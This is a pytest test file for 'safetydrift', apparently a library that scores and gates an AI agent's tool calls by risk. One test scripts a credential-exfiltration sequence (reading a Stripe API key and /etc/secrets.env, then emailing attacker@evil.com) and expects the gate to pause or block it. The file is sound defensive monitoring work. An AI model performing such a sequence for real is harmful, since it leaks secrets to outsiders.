"""
safetydrift tests

Run with:  python -m pytest tests/ -v
"""
import pytest

from safetydrift import (
    DataExposure,
    DriftAssessment,
    InterventionAction,
    Reversibility,
    RiskLevel,
    SafetyState,
    Session,
    ToolCall,
    ToolEscalation,
    classify,
    violation_probability,
    steps_to_threshold,
)
from safetydrift.policy import PolicyEngine


# ── SafetyState tests ────────────────────────────────────────────────────────

class TestSafetyState:
    def test_initial_state_is_safe(self):
        s = SafetyState()
        assert s.risk_level == RiskLevel.SAFE

    def test_fully_escalated_state_is_critical(self):
        s = SafetyState(
            data_exposure=DataExposure.SENSITIVE,
            tool_escalation=ToolEscalation.EXTERNAL,
            reversibility=Reversibility.IRREVERSIBLE,
        )
        assert s.risk_level == RiskLevel.CRITICAL

    def test_state_update_is_monotonic(self):
        s = SafetyState()
        call = ToolCall(
            name="send_email",
            data_exposure=DataExposure.CONFIDENTIAL,
            tool_escalation=ToolEscalation.EXTERNAL,
            reversibility=Reversibility.IRREVERSIBLE,
        )
        s2 = s.update(call)
        assert s2.data_exposure >= s.data_exposure
        assert s2.tool_escalation >= s.tool_escalation
        assert s2.reversibility >= s.reversibility
        assert s2.step_count == 1

    def test_update_does_not_lower_existing_levels(self):
        s = SafetyState(
            data_exposure=DataExposure.SENSITIVE,
            tool_escalation=ToolEscalation.EXTERNAL,
            reversibility=Reversibility.IRREVERSIBLE,
        )
        low_call = ToolCall(
            name="list_files",
            data_exposure=DataExposure.NONE,
            tool_escalation=ToolEscalation.NONE,
            reversibility=Reversibility.FULLY,
        )
        s2 = s.update(low_call)
        # Monotonic: should not lower the state
        assert s2.data_exposure == DataExposure.SENSITIVE
        assert s2.tool_escalation == ToolEscalation.EXTERNAL
        assert s2.reversibility == Reversibility.IRREVERSIBLE


# ── Classifier tests ─────────────────────────────────────────────────────────

class TestClassifier:
    def test_classify_send_email(self):
        c = classify("send_email", {"to": "test@example.com"})
        assert c.tool_escalation == ToolEscalation.EXTERNAL
        assert c.reversibility == Reversibility.IRREVERSIBLE

    def test_classify_read_file(self):
        c = classify("read_file", {"path": "/tmp/notes.txt"})
        assert c.tool_escalation == ToolEscalation.READ
        assert c.reversibility == Reversibility.FULLY

    def test_classify_delete(self):
        c = classify("delete_file", {"path": "/data/records.csv"})
        assert c.reversibility == Reversibility.IRREVERSIBLE

    def test_classify_web_search(self):
        c = classify("web_search", {"query": "python tutorials"})
        assert c.data_exposure == DataExposure.PUBLIC
        assert c.tool_escalation == ToolEscalation.NETWORK

    def test_unknown_tool_gets_safe_default(self):
        c = classify("unknown_novel_tool_xyz")
        assert c.tool_escalation == ToolEscalation.READ
        assert c.reversibility == Reversibility.FULLY


# ── Markov model tests ───────────────────────────────────────────────────────

class TestMarkov:
    def test_safe_state_low_probability(self):
        s = SafetyState()
        p = violation_probability(s, horizon=5, task_type="technical")
        assert p < 0.20, f"Expected low P for safe technical state, got {p}"

    def test_critical_state_high_probability(self):
        s = SafetyState(
            data_exposure=DataExposure.SENSITIVE,
            tool_escalation=ToolEscalation.EXTERNAL,
            reversibility=Reversibility.IRREVERSIBLE,
        )
        p = violation_probability(s, horizon=5, task_type="communication")
        assert p > 0.50, f"Expected high P for critical communication state, got {p}"

    def test_probability_increases_with_horizon(self):
        s = SafetyState(
            data_exposure=DataExposure.CONFIDENTIAL,
            tool_escalation=ToolEscalation.NETWORK,
            reversibility=Reversibility.MIXED,
        )
        p5  = violation_probability(s, horizon=5)
        p10 = violation_probability(s, horizon=10)
        assert p10 >= p5, "Probability should not decrease with more steps"

    def test_steps_to_threshold(self):
        s = SafetyState(
            data_exposure=DataExposure.CONFIDENTIAL,
            tool_escalation=ToolEscalation.EXTERNAL,
            reversibility=Reversibility.MOSTLY_NOT,
        )
        n = steps_to_threshold(s, threshold=0.5, task_type="communication")
        assert 1 <= n <= 20

    def test_probability_in_valid_range(self):
        for risk in range(5):
            for task in ["communication", "technical", "default"]:
                s = SafetyState()
                p = violation_probability(s, horizon=5, task_type=task)
                assert 0.0 <= p <= 1.0


# ── Session / Policy tests ───────────────────────────────────────────────────

class TestSession:
    def test_safe_call_is_allowed(self):
        session = Session(task_type="technical")
        result = session.gate("list_files", {"path": "/workspace"})
        assert result.action != InterventionAction.BLOCK

    def test_email_after_reading_credentials_is_paused_or_blocked(self):
        """Classic data exfiltration pattern: read creds → email externally."""
        session = Session(task_type="communication")
        # Step 1: read credentials
        session.gate("get_api_key", {"service": "stripe"})
        # Step 2: read another confidential file
        session.gate("read_file", {"path": "/etc/secrets.env"})
        # Step 3: now send email — should be flagged
        result = session.gate("send_email", {"to": "attacker@evil.com"})
        assert result.action in (InterventionAction.PAUSE, InterventionAction.BLOCK), (
            f"Expected PAUSE or BLOCK after reading credentials + send_email, "
            f"got {result.action.name} (P={result.violation_probability})"
        )

    def test_state_advances_on_allowed_calls(self):
        session = Session()
        assert session.state.step_count == 0
        session.gate("list_files")
        assert session.state.step_count == 1

    def test_state_does_not_advance_on_block(self):
        session = Session()
        result = session.gate("delete_production_database")
        assert result.action == InterventionAction.BLOCK
        assert session.state.step_count == 0  # state unchanged

    def test_summary_counts_blocks(self):
        session = Session()
        session.gate("delete_production_database")
        summary = session.summary()
        assert summary["blocked"] >= 1

    def test_reset_clears_state(self):
        from safetydrift.session import Session as S
        session = S(task_type="communication")
        session.gate("read_file", {"path": "/notes.txt"})
        assert session.state.step_count == 1
        # Create a new session (simulating reset)
        session2 = S(task_type="technical")
        assert session2.state.step_count == 0
